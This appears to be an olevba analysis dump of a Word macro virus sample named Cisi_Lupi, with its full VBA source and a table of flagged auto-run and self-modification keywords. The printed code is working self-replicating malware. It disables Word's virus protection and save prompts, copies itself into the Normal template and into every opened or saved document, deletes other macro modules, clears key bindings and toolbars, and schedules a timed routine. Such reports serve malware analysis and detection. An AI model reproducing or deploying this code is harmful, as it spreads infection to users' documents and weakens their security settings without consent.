olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cisi
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cisi - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Cisi_Lupi v1.10.000

-------------------------------------------------------------------------------
VBA MACRO Cisi_Lupi.bas 
in file: Virus.MSWord.Cisi - OLE stream: 'Macros/VBA/Cisi_Lupi'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Program kecil ini adalah virus,
'tetapi BUKAN yang akan merusak komputer
'anda, tapi, daripada M$Word ada kena virus
'lain yang ganas, maka lebih baik saya handle
'
'Hormat Saya,
'Syarif Lumintarjo
'<syarifl@bigfoot.com>'

Const DEBUG_MODE = False
Const virName = "Cisi_Lupi"

Function virVersion() As String
  virVersion = "1.10.000"
End Function

Sub ShowMessage()
  MsgBox "Thank's for Not Deleting Cisi_Lupi", vbOKOnly
End Sub

Sub CL_OpenSecurity()
  Options.SaveNormalPrompt = False
  Options.VirusProtection = False
  Options.SavePropertiesPrompt = False
End Sub

'Sub ToolsMacro()
    'Application.VBE.MainWindow.Visible = True
'End Sub

'Sub ViewVbCode()
    'ToolsMacro
'End Sub

'Sub FileTemplates()
    'ToolsMacro
'End Sub

'Sub HelpAbout()
'End Sub

Sub ToolsOptions()
  Options.SaveNormalPrompt = True
  Options.SavePropertiesPrompt = True
  Options.VirusProtection = True
  Dialogs(wdDialogToolsOptions).Show
  CL_OpenSecurity
End Sub

Sub ChangeCap()
On Error Resume Next
  Application.Caption = "Micro$oft Word"
  ActiveWindow.Caption = ActiveDocument.Name
End Sub

Sub RestoreCap()
On Error Resume Next
  Application.Caption = "Bappebti Microsoft Word"
  ActiveWindow.Caption = ActiveDocument.Name
End Sub

Sub CL_ResetSettings()
  KeyBindings.ClearAll
  On Error Resume Next
  For Each Obj In CommandBars
    Obj.reset
  Next Obj
  Options.CheckGrammarAsYouType = False
  Options.CheckSpellingAsYouType = False
  Options.CheckGrammarWithSpelling = False
  Options.DefaultFilePath(wdUserTemplatesPath) = "C:\Program Files\Microsoft Office\Templates"
End Sub

Sub CL_ThisDocumentWriter(pkg)
  Set cm = pkg.VBProject.VBComponents(1).CodeModule
  s = "'Cisi_Lupi" + vbCrLf + _
      "Private Sub Document_Close()" + vbCrLf + _
      "TD_DocClose" + vbCrLf + _
      "End Sub" + vbCrLf + _
      "Private Sub Document_New()" + vbCrLf + _
      "TD_DocNew" + vbCrLf + _
      "End Sub" + vbCrLf + _
      "Private Sub Document_Open()" + vbCrLf + _
      "TD_DocOpen" + vbCrLf + _
      "End Sub"
  cm.AddFromString "'Cisi_Lupi v" + virVersion + vbCrLf
End Sub

Function CL_ClearComps(Direction) As Boolean

  Select Case Direction
    Case 1: Set Package = Application.NormalTemplate
    Case 2: Set Package = Application.ActiveDocument
    Case Else
      Exit Function
  End Select
  
  Set Comps = Package.VBProject.VBComponents
  Comps(1).CodeModule.DeleteLines 1, Comps(1).CodeModule.CountOfLines
  IsOk = False
    
  For Each Obj In Comps
    If Obj.Name = virName Then IsOk = True
    If Obj.Name = "ThisDocument" Then CL_ThisDocumentWriter Package
    If Obj.Name <> virName And Obj.Name <> "ThisDocument" Then
      Application.OrganizerDelete _
        Source:=Package.FullName, _
        Name:=Obj.Name, _
        Object:=wdOrganizerObjectProjectItems
    End If
  Next Obj

  CL_ClearComps = IsOk
  
End Function

Sub CL_OrgCopy(CompName, Direction)
On Error Resume Next
  Select Case Direction
    Case 1 'NormalTemplate to ActiveDocument
    If DEBUG_MODE Then MsgBox NormalTemplate.FullName + " >> " + ActiveDocument.FullName
    Application.OrganizerCopy _
      Source:=NormalTemplate.FullName, _
      Destination:=ActiveDocument.FullName, _
      Name:=CompName, _
      Object:=wdOrganizerObjectProjectItems
    Case 2 'ActiveDocument to NormalTemplate
    If DEBUG_MODE Then MsgBox ActiveDocument.FullName + " >> " + NormalTemplate.FullName
    Application.OrganizerCopy _
      Source:=ActiveDocument.FullName, _
      Destination:=NormalTemplate.FullName, _
      Name:=CompName, _
      Object:=wdOrganizerObjectProjectItems
  End Select
End Sub

Sub TemClearComponents()
  IsOk = CL_ClearComps(1)
  If Not IsOk Then CL_OrgCopy virName, 2
  CL_ResetSettings
End Sub

Sub DocClearComponents()
  IsOk = CL_ClearComps(2)
  If Not IsOk Then CL_OrgCopy virName, 1
  CL_ResetSettings
End Sub

Sub AutoExit()
  If DEBUG_MODE Then MsgBox "AutoExit()"
  ShowMessage
  Application.Quit
End Sub

Sub FileOpen()
  If DEBUG_MODE Then MsgBox "FileOpen()"
  ChangeCap
  WordBasic.DisableAutoMacros True
  On Error Resume Next
  If Dialogs(wdDialogFileOpen).Show <> 0 Then
    DocClearComponents
    ActiveDocument.Save
  End If
  RestoreCap
  WordBasic.DisableAutoMacros False
End Sub

Sub AutoOpen()
  If DEBUG_MODE Then MsgBox "AutoOpen()"
  CL_OpenSecurity
  ChangeCap
  TemClearComponents
  On Error Resume Next
  NormalTemplate.Save
  RestoreCap
End Sub

Sub AutoClose()
  If DEBUG_MODE Then MsgBox "AutoClose()"
  DocClearComponents
  ActiveWindow.Close
End Sub

Sub FileClose()
  If DEBUG_MODE Then MsgBox "FileClose()"
  AutoClose
End Sub

Sub FileSave()
  If DEBUG_MODE Then MsgBox "FileSave()"
  If ActiveDocument.Saved = False Then
    DocClearComponents
    TemClearComponents
    On Error Resume Next
    ActiveDocument.Save
    ActiveDocument.Saved = True
  End If
End Sub

Sub AutoExec()
  If DEBUG_MODE Then MsgBox "AutoExec()"
  WordBasic.DisableAutoMacros True
  CL_OpenSecurity
  Application.OnTime Now + TimeValue("00:00:07"), "Normal." + virName + ".Demolish"
End Sub

Sub TD_DocOpen()
  MsgBox "TD_DocOpen"
End Sub

Sub TD_DocClose()
  MsgBox "TD_DocClose"
End Sub

Sub TD_DocNew()
  MsgBox "TD_DocNew"
End Sub

Sub Demolish()
On Error Resume Next
  C = Documents.Count
  If C <> 0 Then
    Normal.Cisi_Lupi.DocClearComponents
    WordBasic.DisableAutoMacros False
    If ActiveDocument.Name <> "Document1" Then ActiveDocument.Save
  Else
    Application.OnTime Now + TimeValue("00:00:07"), "Normal." + virName + ".Demolish"
  End If
End Sub

Function CL_FindVBComponent(vbp, ComponentName) As Integer
  isFound = False
  i = 1
  For Each Obj In vbp.VBComponents
    isFound = (Obj.Name = ComponentName)
    If isFound Then Exit For
    i = i + 1
  Next Obj
  If isFound Then CL_FindVBComponent = i Else CL_FindVBComponent = -1
End Function

Function CL_GetVersion(vbc) As Integer
  s = vbc.CodeModule.Lines(1, 1)
  If s <> "" Then s = Right(s, Len(s) - 1)
  CL_GetVersion = Val(s)
End Function


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

